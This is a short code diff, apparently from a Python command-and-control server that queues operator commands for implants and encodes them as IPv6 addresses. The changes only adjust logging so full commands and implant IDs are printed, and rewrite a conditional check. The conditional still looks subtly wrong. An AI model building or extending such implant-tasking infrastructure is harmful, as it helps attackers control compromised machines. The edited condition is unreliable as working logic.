@@ -314,7 +314,7 @@ def get_waiting_command(implant_id):
     if queue:
         try:
             operator, command = queue.get()
-            logger.info(f"Fetched command for implant {implant_id}: Operator={operator}, Command={type(command)}")
+            logger.info(f"Fetched command for implant {implant_id}: Operator={operator}, Command={command}")
             return operator, command
         except Empty:
             logger.info("empty queue found")
@@ -543,10 +543,11 @@ def register_routes():
             parsed_data = urllib.parse.parse_qs(unparsed_query)
 
             get_imp_id = parsed_data.get('id')
+            logger.info(get_imp_id[0])
 
             operator, command = get_waiting_command(get_imp_id[0])
-            if operator or command is False:
-                logger.error("operator or command in queue returned as false")
+            if operator and command is False:
+                logger.error("operator and command in queue returned as false")
                 return " "
             checkout_command(get_imp_id[0], operator, command)
             command = json.dumps(ipv6_encoder.string_to_ipv6(command))
